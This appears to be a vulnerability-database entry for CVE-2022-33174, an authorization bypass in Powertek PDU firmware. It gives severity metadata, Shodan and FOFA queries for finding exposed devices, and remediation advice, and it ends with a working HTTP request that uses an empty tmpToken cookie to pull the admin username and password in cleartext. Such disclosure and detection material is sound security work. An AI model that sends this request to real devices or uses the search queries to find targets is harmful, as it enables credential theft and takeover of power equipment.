---
layout: post
cve_id: CVE-2022-33174
title: Powertek Firmware <3.30.30 - Authorization Bypass
pcap: true
pcap_path: /pcaps/2022/CVE-2022-33174.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-33174.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pikpikcu
severity: high
impact: 'An attacker can bypass authentication and gain unauthorized access to the
  Powertek Firmware, potentially leading to further compromise of the system.

  '
remediation: 'Upgrade the Powertek Firmware to version 3.30.30 or higher to mitigate
  the vulnerability.

  '
reference:
- https://gynvael.coldwind.pl/?lang=en&id=748
- https://nvd.nist.gov/vuln/detail/CVE-2022-33174
- https://github.com/Henry4E36/CVE-2022-33174
- https://github.com/k0mi-tg/CVE-POC
- https://github.com/nomi-sec/PoC-in-GitHub
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2022-33174
  cwe-id: CWE-863
  epss-score: 0.81715
  epss-percentile: 0.99153
  cpe: cpe:2.3:o:powertekpdus:basic_pdu_firmware:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: powertekpdus
  product: basic_pdu_firmware
  shodan-query:
  - http.html:"Powertek"
  - http.html:"powertek"
  fofa-query: body="powertek"
tags:
- cve2022
- cve
- powertek
- auth-bypass
- powertekpdus
- vuln
---

## ðŸ” Vulnerability Description
Powertek firmware (multiple brands) before 3.30.30 running Power Distribution Units are vulnerable to authorization bypass in the web interface. To exploit the vulnerability, an attacker must send an HTTP packet to the data retrieval interface (/cgi/get_param.cgi) with the tmpToken cookie set to an empty string followed by a semicolon. This bypasses an active session authorization check. This can be then used to fetch the values of protected sys.passwd and sys.su.name fields that contain the username and password in cleartext.


## ðŸŒ HTTP Request
```nohighlight
GET /cgi/get_param.cgi?xml&sys.passwd&sys.su.name HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15
Connection: close
Cookie: tmpToken=;
Accept-Encoding: gzip
```

